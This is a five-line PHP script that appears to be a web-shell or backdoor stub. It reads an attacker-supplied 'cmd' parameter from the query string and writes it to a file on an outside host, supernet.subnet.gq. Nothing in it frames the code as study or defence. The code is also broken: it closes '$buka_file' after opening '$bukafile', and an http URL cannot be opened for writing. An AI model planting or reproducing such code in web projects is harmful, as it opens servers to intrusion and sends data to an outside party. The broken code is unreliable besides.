<?php
$cmd= $_GET['cmd'];
$bukafile=fopen('http://supernet.subnet.gq/faktur.txt','w');
fwrite($bukafile,$cmd);
fclose($buka_file);